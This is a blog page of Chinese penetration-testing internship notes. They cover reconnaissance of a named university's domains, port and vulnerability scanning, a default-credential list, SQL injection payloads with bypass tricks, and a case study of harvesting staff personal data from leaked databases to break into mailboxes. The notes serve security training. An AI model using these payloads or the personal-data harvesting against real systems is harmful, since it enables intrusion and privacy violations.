@@ -1,0 +1,1045 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/crayon3.png">
+  <link rel="icon" href="/img/crayon3.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Feaster">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="7.11Burpsuite 主域名-&gt;子域名-&gt;IP（比较粗略的信息采集）主域名123456Whois查域名 企查查，天眼查，爱企查-网站备案（查看目标的互联网资产，域名等）-股权结构图&#x2F;股权穿透图（查看目标单位体系，依照赛方要求根据股权占比确定目标单位） 收集主域名时要把控股的公司也考虑在内以CSU为例，先获取csu.edu.cn的主域名，登录天眼查，可以获取到另外两个域名，收集以上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="雨笋实习笔记">
+<meta property="og:url" content="http://example.com/2024/10/10/yusun/index.html">
+<meta property="og:site_name" content="Feaster&#39;s Blog">
+<meta property="og:description" content="7.11Burpsuite 主域名-&gt;子域名-&gt;IP（比较粗略的信息采集）主域名123456Whois查域名 企查查，天眼查，爱企查-网站备案（查看目标的互联网资产，域名等）-股权结构图&#x2F;股权穿透图（查看目标单位体系，依照赛方要求根据股权占比确定目标单位） 收集主域名时要把控股的公司也考虑在内以CSU为例，先获取csu.edu.cn的主域名，登录天眼查，可以获取到另外两个域名，收集以上">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-10T12:57:09.582Z">
+<meta property="article:modified_time" content="2024-10-10T14:37:36.845Z">
+<meta property="article:author" content="Feaster">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>雨笋实习笔记 - Feaster&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"9c58e093c73f9085094c74426cbb5481","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?9c58e093c73f9085094c74426cbb5481";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="雨笋实习笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-10 20:57" pubdate>
+          October 10, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          111 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">雨笋实习笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="7-1"><a href="#7-1" class="headerlink" title="7.1"></a>7.1</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Burpsuite</span><br></code></pre></td></tr></table></figure>
+<h4 id="主域名-子域名-IP（比较粗略的信息采集）"><a href="#主域名-子域名-IP（比较粗略的信息采集）" class="headerlink" title="主域名-&gt;子域名-&gt;IP（比较粗略的信息采集）"></a>主域名-&gt;子域名-&gt;IP（比较粗略的信息采集）</h4><h5 id="主域名"><a href="#主域名" class="headerlink" title="主域名"></a>主域名</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Whois查域名 <br><br>企查查，天眼查，爱企查-网站备案（查看目标的互联网资产，域名等）-股权结构图/股权穿透图（查看目标单位体系，依照赛方要求根据股权占比确定目标单位） <br>收集主域名时要把控股的公司也考虑在内<br><br>以CSU为例，先获取csu.edu.<span class="hljs-literal">cn</span>的主域名，登录天眼查，可以获取到另外两个域名，收集以上三个域名 <br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/recordQuery">工业和信息化部政务服务平台ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">有域名一定有在此网站上有备案<br>在<span class="hljs-string">&quot;ICP备案查询&quot;</span>中查询<span class="hljs-string">&quot;中南大学&quot;</span>,可以获取到三个域名，对天眼查上获取的域名进行了验证 <br>hn<span class="hljs-selector-class">.edu</span><span class="hljs-selector-class">.cn</span><br>csu<span class="hljs-selector-class">.edu</span><span class="hljs-selector-class">.cn</span><br>cnecsu<span class="hljs-selector-class">.cn</span><br><br>红队尽可能利用多种平台和工具获取充足的信息，国家平台信息比较完整，但可能纰漏，尽可能利用多个工具补充。<br></code></pre></td></tr></table></figure>
+<h5 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vim">子域名相当于二级域名或三级，例如sony.net二级，s.sony.net三级<br><br>主动收集：字典枚举（用的多），置换扫描，域传送漏洞，DNSSEC，DNS缓存<br><br>字典枚举：<br><br>字典枚举工具：<br>	subDomainsBrute多并发DNS暴力枚举工具<br>	OneForAll<br>	subFinder<br>	BruteSublist3r<br>	layer子域名挖掘机<br><br>试用了subDomainsBrute，从Github上下载，将主域名整理为txt，利用命令行带参数运行subDomainsBrute.<span class="hljs-keyword">py</span>，-<span class="hljs-keyword">f</span>对文件内所有域名枚举，-i对单个域名枚举，先尝试了csu.edu.<span class="hljs-keyword">cn</span>没有枚举到子域名；又尝试了百度，也不行，不好使 <br><br>试用了BruteSublist3r，开了Kali虚拟机，从Github上下载，运行sublist3r.<span class="hljs-keyword">py</span>进行枚举，-d单个域名枚举，先尝试了csu.edu.<span class="hljs-keyword">cn</span>，好使，收集到了一系列子域名，对其进行整理<br><br>试用了layer子域名挖掘机，可视化界面，但是容易卡死，要把线程调小一些<br><br>试用了OneForAll，用得最多，最好用，支持多种爆破方式，从Github上下载，运行oneforall.<span class="hljs-keyword">py</span>进行枚举，--target单个域名，--targets域名列表，枚举过程中运用了多种国内外搜索引擎（google，yahoo等）。查看oneforall目录，查看api.<span class="hljs-keyword">py</span>文件，包括了oneforall调用的搜索引擎接口进行子域名整合，需要自行配置搜索引擎API，以FOFA为例，需要注册后将邮箱和用户KEY进行配置。枚举完成后，对生成的csv文件进行查看，要对子域名进行汇总，有些域名对应多个IP，使用了CDN技术，隐藏了真实IP，所以可以把这些域名删除，只保留域名对应单IP的列，对于生成的ite文件可以使用数据库查看工具Navicat进行查看<br><br>对csu.edu.<span class="hljs-keyword">cn</span>进行了oneforall的使用，获取了<span class="hljs-number">620</span>个子域名<br><br>粗略的信息采集主要通过搜索引擎平台HUNTER，<span class="hljs-number">360</span>（QUAKE），FOFA，SHODAN，Virustotal（国外）；以FOFA为例，不同引擎的搜索语法不同，需要查看参考语法，根据语法进行IP、根域名等的查询子域名信息。FOFAView有可视化的FOFA，可以利用FOFA的API进行配置使用。无影工具可以整合多个搜索引擎，可以配置各个引擎的API进行信息采集<br><br>检索完所有的目标资产，就可以导出所有的资产信息，导出所有的资产信息后，将http或https的协议头替换为空，得到域名<br></code></pre></td></tr></table></figure>
+<h5 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css">站长之家，可以通过目标域名在全国范围的监测点情况查看目标是否使用了CDN技术，也可以使用PING指令查看PING的实际域名与要PING的域名是否一致，判断目标是否试用了CDN技术。CDN技术一般采用在比较大型的官网，解决全国用户在访问服务器时效率的问题<br><br>最好的子域名转IP的方式就是利用PING指令，可以利用Python脚本将域名批量进行PING，去除无法PING到的IP，就得到了对应的IP。将IP进行排序，特别是连续的IP，可以判断数个IP是否在同一C段（<span class="hljs-number">202.192</span>.<span class="hljs-number">1.6</span>/<span class="hljs-number">24</span>），C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>，<span class="hljs-selector-tag">A</span>段就是<span class="hljs-number">192</span>，<span class="hljs-selector-tag">B</span>段是<span class="hljs-number">168</span>，C段是<span class="hljs-number">0</span>，D段是<span class="hljs-number">1</span>，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段<span class="hljs-number">1</span>-<span class="hljs-number">255</span>中的一台服务器，然后利用工具嗅探拿下该服务器。通过收集C段可以尽可能获取完全目标资产，特别是不遗失边缘资产，可以搜集在C段内前<span class="hljs-number">10</span>或后<span class="hljs-number">10</span>的服务器<br><br>扫描完IP后，可以进行指定IP的端口扫描，寻找攻击的切入点<br><br>Goby可以用于梳理资产面，可以使用常用端口或全端口进行内置的nmap扫描，因此扫描速度比较慢，但对于单个ip的扫描信息比较完整;Goby内置了PoC，包含很多漏洞，通过禁用漏洞功能可以只使用扫描功能<br><br>由于nmap比较慢而且特征比较明显，现在更多使用masscan。<span class="hljs-attr">--rate</span>设置扫描速率，-<span class="hljs-selector-tag">p</span>设置扫描端口范围，<span class="hljs-attr">--it</span>可以批量扫描ip，扫描ip是攻击行为，需要注意使用<br><br>webfinder-next也可以进行扫描，是用java写的<br><br>WAF防火墙可以防御端口扫描<br><br>在HUNTER利用语法检索可以根据目标<span class="hljs-selector-tag">HTML</span>文档中的内容进行搜索（标题等），可以获取到可能与主域名相关的资产的IP、域名。通过细化搜索条件，比如web<span class="hljs-selector-class">.title</span>（查看<span class="hljs-selector-tag">HTML</span>文档的title标签）、web<span class="hljs-selector-class">.body</span>（查看<span class="hljs-selector-tag">HTML</span>文档的<span class="hljs-selector-tag">body</span>标签）、web<span class="hljs-selector-class">.icon</span>（查看图标），可以得到更加精确的资产列表<br><br>可以使用HUTER的cert进行证书的搜索，搜索使用同一证书的资产信息。使用crt<span class="hljs-selector-class">.sh</span>利用证书的指纹中的SHA-<span class="hljs-number">256</span>/<span class="hljs-number">1</span>进行证书详细信息的获取，可以找到一些使用同一证书的域名。利用Myssl<span class="hljs-selector-class">.com</span>/censys可以查找指定和指定资产使用同一证书的其他域名。<br></code></pre></td></tr></table></figure>
+<h4 id="对于已发现资产的漏洞挖掘和扫描"><a href="#对于已发现资产的漏洞挖掘和扫描" class="headerlink" title="对于已发现资产的漏洞挖掘和扫描"></a>对于已发现资产的漏洞挖掘和扫描</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">day</span>-&gt;</span><span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-title">day</span>-&gt;</span>nday<br><br>讲了SpringBoot的Actuator未授权访问漏洞，由于很多web应用的开发都使用了SpringBoot，所以可能可以利用框架的漏洞对资产进行攻击。可以使用<span class="hljs-number">360</span>Finger-P对网站的使用框架进行识别，根据使用的框架中已被发现的漏洞可以进行测试。使用BP，输入已被发现的Jeecg框架的漏洞PoC，替换host和其他信息，发现漏洞已被修复，类似的思路可用于其他漏洞<br><br>PoC是去检测是否存在漏洞，EXP是利用漏洞<br><br>可以在CNVD上查看漏洞，但无法查看PoC，利用CNVD编号可以搜索PoC复现<br><br>实际打点由于时间紧张主要使用nday漏洞<br><br>使用afrog(PoC可定制化的漏洞扫描器)进行漏洞扫描，包括<span class="hljs-number">1400</span>余个PoC。也可以使用nuclei进行漏洞扫描，编写包含漏洞的yaml文件可以进行针对性扫描<br><br>Java常见框架漏洞：shiro（有readme的特征，很容易识别），SpringBoot，log4j（jndi注入，查看能否从外网获取外部类使用，nuclei无法检测），Fastjson，struts2<br><br>xray（内置Payload）+rad（爬取接口）可以检测log4j的SQL注入漏洞，rad爬取接口，发给xray进行漏洞扫描<br><br>在xray上配置反连平台可以扫描更多的漏洞，如log4j和struts2的漏洞<br></code></pre></td></tr></table></figure>
+<h4 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">除了资产信息，还需要搜集用户的敏感信息<br><br>以xx大学为例<br><br>使用google搜索的site搜索所有关于目标域名的站点，发现校园邮箱，用户名为教工号，密码与身份证有关，因此需要搜索个人身份信息。通过搜索目标单位的个人电话号码，可以获取到个人姓名和手机号，利用社工库可以进行敏感信息的获取，通过弱口令可以登录校园邮箱，使用xxx进行抓包可以在通讯录跳转处获取到所有其他用户的邮箱、电话号码等信息，进而控制更多邮箱。通过目标VPN可以进入内网，扩大战果。<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-2"><a href="#7-2" class="headerlink" title="7.2"></a>7.2</h3><h4 id="弱口令、验证码"><a href="#弱口令、验证码" class="headerlink" title="弱口令、验证码"></a>弱口令、验证码</h4><p>wappalyzer查看网站是使用什么语言搭建的<br><code>先对资产进行漏洞扫描，使用Wappalyzer对网站使用的技术栈进行剖析，查找技术栈中的技术是否存在可以利用的如1day、nday等漏洞，随后优先针对后台进行测试</code><br>html+css+js 前端代码 vue.js –&gt; xss漏洞 –&gt; 用户可以写入javascript语句<br>后端开发脚本(在服务器执行) –&gt; php,asp,asp.net,java –&gt; 文件上传 –&gt; web中间件(web服务器)<br>php + Ngixnx<br>asp&#x2F;asp.net + IIS<br>java + tomcat,apache</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">网站前端代码三件套：HTML+CSS+JS，vue.js。通过浏览器查看源码可以看到源码，也可以修改前段代码造成XSS漏洞，XSS漏洞是用户可以在前端写入JavaScript语句，使得JS语句在前端可以运行<br>后端开发脚本：PHP、ASP、ASP.<span class="hljs-keyword">NET</span>、JavaWeb（大部分使用、稳定、高并发），可以通过文件上传，上传恶意代码在服务器端执行，要根据网站的搭建语言来针对性构建对应语言的恶意代码脚本上传，不然无法运行；Web中间件/服务器（解析后端开发脚本并执行）：Nginx（PHP）、<span class="hljs-keyword">IIS</span>（ASP+ASP.<span class="hljs-keyword">NET</span>）、Tomcat（JavaWeb）、Apache（Kali自带），中间件也存在很多漏洞，可以加以利用；以Nginx为例，Nginx存在解析和截断漏洞<br></code></pre></td></tr></table></figure>
+<p>数据库 –&gt; sql注入漏洞<br><code>服务器端经常会有数据库操作，所以也可以构造一些数据库查询的语句，如SQL语句，这些语句可以在服务器端的数据库执行，造成SQL注入漏洞</code><br>使用burpsuite对<a target="_blank" rel="noopener" href="http://www.xxxxxx.com/admin/login.php">http://www.xxxxxx.com/admin/login.php</a> 进行爆破<br>有效用户名及密码:admin&#x2F;123654 root</p>
+<p>XXLJOB任务调度中心 默认账号密码admin&#x2F;123456<br>nacos系统监控 NACOS&#x2F;NACOS</p>
+<p>zabbix系统监控 admin&#x2F;zabbix<br>grafana控制台 admin&#x2F;admin<br>druid组件 admin&#x2F;123456<br>若依 admin&#x2F;admin123</p>
+<p>在 <a target="_blank" rel="noopener" href="http://tools.sbbbb.cn/defaultpasswd/">http://tools.sbbbb.cn/defaultpasswd/</a> 可以查看设备默认口令</p>
+<h4 id="社工字典工具"><a href="#社工字典工具" class="headerlink" title="社工字典工具"></a>社工字典工具</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">tscanPlus</span><br></code></pre></td></tr></table></figure>
+<h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><h5 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h5><h6 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h6><h6 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h6><p>bmw网站包暴露了大量接口 可以通过</p>
+<h4 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">忘记密码 -&gt; 找回密码 -&gt; 输入手机号(用户名枚举)<br>输入用户名<span class="hljs-regexp">/邮箱/</span>手机阶段 -&gt; 填写验证码和新密码阶段(验证码较简单可以暴力破解)<br>练习:<br><span class="hljs-number">1</span>.[PHP逻辑漏洞利用实战(第<span class="hljs-number">1</span>题)](https:<span class="hljs-regexp">//</span>www.mozhe.cn<span class="hljs-regexp">/bug/</span>detail/RmF2NExLM2E2QnZReGJCQzBoTEdRdz09bW96aGUmozhe)<br><span class="hljs-number">2</span>.[portswigger](https:<span class="hljs-regexp">//</span>portswigger.net<span class="hljs-regexp">/web-security/</span>authentication<span class="hljs-regexp">/other-mechanisms/</span>lab-password-reset-broken-logic)<br></code></pre></td></tr></table></figure>
+<h3 id="7-3"><a href="#7-3" class="headerlink" title="7.3"></a>7.3</h3><h4 id="php解析限制"><a href="#php解析限制" class="headerlink" title="php解析限制"></a>php解析限制</h4><p>在apache .htaccess中可以限制特定命令的使用</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/engeng/articles/5948089.html">https://www.cnblogs.com/engeng/articles/5948089.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html</a></p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><h5 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h5><p>php中可以拿到用户输入的参数并执行sql语句 攻击者可以控制输入构造攻击代码执行其他的命令<br>sql执行select * from users where id &#x3D; ‘用户输入’<br>先闭合单引号，<br>注释符：#或者–+</p>
+<ul>
+<li>数字型</li>
+<li>字符型：’ “” （）’(</li>
+<li>有回显：出现报错信息</li>
+<li>无回显：不管语法是否正确都显示一致 布尔盲注</li>
+</ul>
+<h5 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h5><ol>
+<li>先在id后加单引号，如果报错则为字符型</li>
+<li>判断sql语句是否执行：<code>select * from users where id = &#39;1 and 1=1&#39;</code>和<code>select * from users where id = &#39;1 and 1=2&#39;</code>或者<code>select * from users where id = &#39;-1 or 1=1</code>和<code>select * from users where id = &#39;-1 or 1=2&#39;</code></li>
+<li>在union联合查询之前可以先使用order by判断字段个数<code>select * from users where id = &#39;&#39; order by n</code>其中<code>n</code>表示字段个数</li>
+<li>然后使用联合查询<code>select * from users where id = &#39;-1&#39; and union select 1,2,3 --+</code>其中n为几就select到几，从而判断回显的位置<br><em>常用查询信息：user() database() @@version</em></li>
+</ol>
+<h5 id="mysql利用报错函数查询-只能用于显示报错信息的网站"><a href="#mysql利用报错函数查询-只能用于显示报错信息的网站" class="headerlink" title="mysql利用报错函数查询(只能用于显示报错信息的网站)"></a>mysql利用报错函数查询(只能用于显示报错信息的网站)</h5><p>updatexml：用于修改xml文档名称，共三个参数，报错位置在第二个参数<code>select * from users where id = 1 union updatexml(1,user(),3)</code><br>extractvalue：共两个参数，报错位置在第二个参数<code>select * from users where id = 1 union extractvalue(1,user())</code></p>
+<h5 id="在获取数据库名称之后在mysql内置数据库-information-schema-中查询表名"><a href="#在获取数据库名称之后在mysql内置数据库-information-schema-中查询表名" class="headerlink" title="在获取数据库名称之后在mysql内置数据库__information_schema__中查询表名"></a>在获取数据库名称之后在mysql内置数据库__information_schema__中查询表名</h5><ul>
+<li>SCHEMATA</li>
+<li>TABLES： <code>select * from users where id = &#39;-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;数据库名称&#39; --+</code></li>
+<li>COLUMNS：<code>select * from users where id = &#39;-1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;表名&#39; --+</code><br><em>可以用limit限制遍历每条数据的列</em><br><em>当回显点比较少时可以用concat()或者group_concat()将字段连接一起显示，group_concat()是将查询到的所有条目连接到一起<code>select * from users where id = &#39;1&#39; and updatexml(1,(select 1,2,column_name from information_schema.columns where table_name=&#39;表名&#39;),1) --+</code></em></li>
+</ul>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>只有正确和错误两种回显<br>没有回显位置，所以不能使用union联合查询；也看不到报错信息，所以也不能用报错注入<br>常用的函数：</p>
+<ul>
+<li>substr(str,start,length):例如数据库名称为__security__可以使用<code>select substr(database(),1,1)=&#39;s&#39;``select substr(database(),2,1)=&#39;e&#39;</code>判断出数据库名称的前两位</li>
+<li>left:<code>select left(database(),1)=&#39;s&#39;``select left(database(),2)=&#39;se&#39;``select left(database(),3)=&#39;sec&#39;</code></li>
+<li>right:和left用法一样，但是从右向左&#96;select right(database(),2)&#x3D;’ty’</li>
+<li>length:&lt;&#x3D;&gt;判断名称长度<code>select length(database())=8</code></li>
+<li>ascii:和其他函数结合使用<code>select substr(user(),1,1)=&#39;s&#39;</code>，不允许用户输入用单引号时可以<code>select ascii(substr(user(),1,1))=115</code></li>
+<li>if:<code>select if(substr(database(),1,1)=&#39;s&#39;,1,2)</code>如果条件成立返回1否则返回2，条件取值可以为sleep()或者exp()</li>
+<li>when:当if被禁用时可以使用when<code>select case when substr(database(),1,1)=&#39;s&#39; then sleep(1) else 0 end</code></li>
+<li>benchmark:重复计算<code>select case when substr(database(),1,1)=&#39;s&#39; then BENCHMARK(1000000,ENCODE(&#39;hello&#39;,&#39;goodbye&#39;)) else 0 end</code></li>
+</ul>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><ul>
+<li>空格</li>
+<li>逗号:使用from或者offset，mid或者substr<ul>
+<li>mid: mid(str FROM pos FOR len)</li>
+<li>也可以使用sql中的like配合_或者%来依次爆破</li>
+</ul>
+</li>
+<li>and:&amp; |</li>
+<li>内联注释</li>
+</ul>
